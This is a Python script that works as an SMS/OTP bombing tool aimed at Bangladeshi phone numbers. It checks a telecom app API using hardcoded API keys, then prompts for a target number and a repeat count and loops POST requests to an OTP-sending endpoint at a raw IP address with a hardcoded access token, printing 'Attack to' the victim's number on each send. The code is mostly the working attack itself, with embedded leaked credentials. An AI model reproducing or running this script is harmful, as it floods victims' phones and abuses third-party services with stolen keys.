import requests
import json
import datetime
class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

print(f"{bcolors.OKBLUE}{bcolors.BOLD}")
t= datetime.datetime.now()
url = 'https://circle.robi.com.bd/mylife/appapi/appcall.php?op=getUserInfobyNickname&msisdn=8801819400400'
myobj = {'nickname':"circle"}




#use the 'headers' parameter to set the HTTP headers:
x = requests.post(url, data = myobj, headers = {"x-api-key": "2c762ea43f23a61c3743b85e9371b94d","x-app-key":"000oc0so48owkw4s0wwo4c00g00804w80gwkw8kg"})

#convert response to json format

#parse the json to get the service ticket
response= x.text
#the 'demopage.asp' prints all HTTP Headers
#8801147116455

json_object = json.loads(response)

json_formatted_str = json.dumps(json_object, indent=1)

# print(json_formatted_str)
# print(json_object)

# Input the key value that you want to search
keyVal = "data"

# load the json data
customer = json.loads(response)
# Search the key value using 'in' operator
if keyVal in customer:
    while 1:
        print("Number Example 01234567890")
        name = input("Enter 1st Number ")

        i=int(input("Enter Counter "))
        y=0
        while y<i:
            url = 'http://3.1.3.46:9000/api/v1/sendotp/88'
            myobj1 = {"accessinfo":{"access_token":"K165S6V6q4C6G7H0y9C4f5W7t5YeC6","referenceCode":"20200119115422"}}
            url=url+name

    #use the 'headers' parameter to set the HTTP headers:
            try:
                requests.post(url, data = json.dumps(myobj1),headers = {"Content-Type":"application/json; charset=utf-8","Content-Length":"97"})
                print(f"{bcolors.OKBLUE}{bcolors.BOLD}")
                print("Attack to ",name)
            except:
                print(f"{bcolors.FAIL}{bcolors.BOLD}")
                print("Server Error")
            try:
                requests.post(url, data = json.dumps(myobj1),headers = {"Content-Type":"application/json; charset=utf-8","Content-Length":"97"})
                print(f"{bcolors.OKBLUE}{bcolors.BOLD}")
                print("Attack to ",name)
            except:
                print(f"{bcolors.FAIL}{bcolors.BOLD}")
                print("Server Error")
            try:
                requests.post(url, data = json.dumps(myobj1),headers = {"Content-Type":"application/json; charset=utf-8","Content-Length":"97"})
                print(f"{bcolors.OKBLUE}{bcolors.BOLD}")
                print("Attack to ",name)
            except:
                print(f"{bcolors.FAIL}{bcolors.BOLD}")
                print("Server Error")
            try:
               requests.post(url, data = json.dumps(myobj1), headers = {"Content-Type":"application/json; charset=utf-8","Content-Length":"97"})
               print("Attack to ",name)
            except:
                print(f"{bcolors.FAIL}{bcolors.BOLD}")
                print("Server Error")
            try:
                requests.post(url, data = json.dumps(myobj1), headers = {"Content-Type":"application/json; charset=utf-8","Content-Length":"97"})
                print(f"{bcolors.OKBLUE}{bcolors.BOLD}")
                print("Attack to ",name)
            except:
                print(f"{bcolors.FAIL}{bcolors.BOLD}")
                print("Server Error")
            print(y)
            y= y+1
        print("\nCounting Completed")
else:
    # Print the message if the value does not exist
    print("SerVer Down!!!!")
